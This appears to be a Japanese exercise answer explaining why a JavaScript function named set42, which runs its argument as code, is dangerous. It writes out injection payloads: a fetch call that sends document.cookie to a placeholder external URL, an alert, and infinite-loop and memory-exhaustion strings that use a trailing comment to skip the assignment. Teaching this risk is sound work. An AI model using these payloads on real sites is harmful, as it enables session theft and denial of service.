# 問題4.7
## セキュリティ面で危険
ブラウザでユーザーがset42の関数を操作する場合、引数として```fetch('外部のURL?d='+document.cookie)```でクエリとして盗んだcookieを外部送信されてしまう。  
set42には42を代入するという処理が書かれているが、代入前に```//```でコメントアウトされてしまうと、その処理は無視されることになるので、エラー処理にもならず実行されてしまう。  
```"fetch('外部のURL?d='+document.cookie) //"```のように引数を渡すことで、任意のコードを実行させてしまう。  
他にも警告アラートを表示させる```"alert('攻撃!')" //```なども実行されてしまう。

## システム負荷の面で危険
JavaScriptでは```while(true) {}```でシステム負荷になる。  
この無限ループを実行させるだけで、CPUを食い尽くすビジーループを起こさせることができる。また、JavaScriptは基本的にシングルスレッドなので、この処理が無限ループしている間は他の処理ができなくなってしまう。  
このような点でシステム負荷を起こさせることができる。  
先ほどと同じようにコメントアウトさせるものも含めた```"while(true) {} //"```をset42の引数として渡せばシステム負荷を起こすことができる。  
ちなみに、メモリ枯渇を狙ったようなコード実行もさせることは可能だが、クラッシュしたりして異常終了することが多い。（```const a = []; while (true) { a.push(1); }```のように永遠に配列にプッシュさせ続けるなど）
